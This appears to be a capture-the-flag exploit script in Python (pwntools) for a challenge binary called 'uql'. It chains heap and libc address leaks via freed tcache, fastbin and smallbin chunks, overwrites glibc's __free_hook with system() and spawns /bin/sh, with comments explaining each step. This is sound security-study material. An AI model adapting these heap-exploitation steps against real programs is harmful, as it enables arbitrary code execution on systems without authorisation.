#!/usr/bin/python3

from pwn import *

r = process('./uql')
l = ELF('./libc-2.31.so')

def insert(s):
    return f" insert {s}"

def remove(s):
    return f" remove {s}"

def modify(src, dst, idx):
    return f" modify {src} to be {dst} at {idx}"

def display():
    return ' display everything'

def execute(c):
    r.sendlineafter('> ', c)

## vector 0x80 size first (4 elements)

##### leak heap #####
c = insert('A'*0x10)
c += insert('B'*0x10)
c += insert('C'*0x10) # C to avoid collidate
c += remove('C'*0x10) # 0x20 tcache 6
execute(c)

c = remove('B'*0x10) # here can't leak heap address because next chunk is other chunk
# and if we show chunk in next time, iterator will be the chunk we freed in here, and it will leak address
# 0x20 tache is filled (7)
execute(c)

c = remove('A'*0x10)
c += display() # will show freed std::string which is the next db
# 0x20 fastbin 1
execute(c)

heap = u64(r.recv(6).ljust(8, b'\x00'))

info(f"""
heap = {hex(heap)}
""")

"""
In here, you will see 0x20 tcache is filled, and 0x20 fastbin has a chunk
which address is the address we leaked plus 0x20 (end with 0x780).

Then what we need to do is to make a 0x100 chunk (without header 0x10), 
and the chunk will be allocated to the vector with capacity 8 (0x20*8+0x10),
we make a faked vector element which data_ptr points to the fastbin chunk.

If we allocate a 0x420 size (large bin size), libc will puts chunk in fastbin into smallbin,
and fastbin chunk will contain smallbin address in main_arema.

We trick iteractor to iterate the faked chunk, it will print libc address, leak done!
"""


##### leak libc #####
## 0x100 ==> 0x110 chunk ==> for double size vector (0x80*2 + 0x10)
c = b'A'*0xc0 # dummy, 0x20 * 6 == 0xc0
# why 6? because vector will double its size when capacity is larger than 75% filled.
""" fake vector element """
c += p64(heap + 0x20) # ptr to next iterator
c += p64(0x8) # fake data size
c += p64(0x8) # fake data size
c += p64(0) # NULL
c = c.ljust(0x100, b'A') # fill 'A' to 0x100
execute(c)
c = ''
for i in range(6):
    c += insert(chr(i+0x41)*0x8)

print(c)
execute(c)

c = 'X'*0x420 # find from top chunk => puts fastbin into smallbin => libc address
execute(c)

c = display()
c += remove('F'*0x8)
execute(c)

for _ in range(5):
    r.recvline()

libc = u64(r.recv(8)) - 0x1ebbf0
_system = libc + l.sym['system']

info(f"""
libc = {hex(libc)}
""")

##### write into free_hook #####
## trick same with leak libc
c = b'A'*0x180 # dummy, 0x20 * 0xc == 0x180
c += p64(libc + l.sym['__free_hook'])
c += p64(0x8)
c += p64(0x8)
c += p64(0)
c = c.ljust(0x200, b'A') # double size vector (0x100*2)
execute(c)

# 0xc is ((0x200*0.75) // 0x20)
# 0x5 is previous round chunks
c = ''
for i in range(0x5, 0xc):
    c += insert(chr(i+0x41)*0x8)

c += remove(chr(0xb+0x41)*0x8)

for i in range(6):
    m = (_system >> (8*i)) & 0xff
    c += modify('\x00'*8, chr(m), i)

execute(c) # write free_hook done

##### get shell #####
execute(b'/bin/sh'.ljust(0x10, b'\x00'))

r.interactive()
